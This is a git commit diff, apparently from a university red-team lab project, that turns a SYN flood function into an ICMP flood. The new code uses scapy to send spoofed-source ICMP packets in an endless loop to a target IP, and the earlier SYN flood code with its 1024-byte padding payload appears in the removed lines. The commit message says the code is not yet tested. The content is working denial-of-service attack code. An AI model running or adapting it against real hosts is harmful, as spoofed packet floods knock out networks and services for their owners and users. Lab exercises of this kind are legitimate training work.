89c7e55a606ed2a766928628b07a1177dc6d9094
alan-gassine <alan.gassine@etudiant.univ-rennes1.fr>
2022-11-14 09:17:39 +0100

    added http and icmp floods and updated syn => still to be tested!

--- red/attacks/icmp_flood.py
+++ red/attacks/icmp_flood.py
@@ -8,9 +8,7 @@ from scapy.all import *
 # SOURCE_IP = "10.1.5.3" # Change this IP to spoof
 TARGET_IP = "10.1.5.2"
 
-def syn_flood(SOURCE_IP = "10.1.5.3"):
+def icmp_flood(SOURCE_IP = "10.1.5.3"):
     print("Sending packets...")
     ip = IP(src=SOURCE_IP, dst=TARGET_IP)
-    tcp = TCP(sport=RandShort(), dport=80, flags="S")
-    raw = Raw(b"X"*1024)
-    send(ip/tcp/raw, loop=1, verbose=0)
+    send(ip/ICMP(), loop=1, verbose=0)
